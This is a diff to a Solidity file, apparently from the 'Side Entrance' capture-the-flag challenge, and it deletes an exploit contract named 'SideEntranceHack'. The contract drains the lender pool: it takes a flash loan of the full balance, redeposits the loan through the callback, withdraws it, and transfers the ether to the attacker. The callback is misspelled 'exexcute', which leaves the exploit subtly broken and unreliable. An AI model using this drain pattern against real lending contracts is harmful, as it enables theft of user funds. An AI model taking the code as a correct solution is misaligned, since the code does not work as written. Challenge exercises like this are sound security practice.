@@ -44,25 +44,3 @@ contract SideEntranceLenderPool {
         if (address(this).balance < balanceBefore) revert RepayFailed();
     }
 }
-
-contract SideEntranceHack {
-    SideEntranceLenderPool public pool;
-
-    constructor(address _pool) {
-        pool = SideEntranceLenderPool(_pool);
-    }
-
-    fallback() external payable {}
-
-    receive() external payable {}
-
-    function attack() external {
-        pool.flashLoan(address(pool).balance);
-        pool.withdraw();
-        payable(msg.sender).transfer(address(this).balance);
-    }
-
-    function exexcute() external payable {
-        pool.deposit{value: msg.value}();
-    }
-}
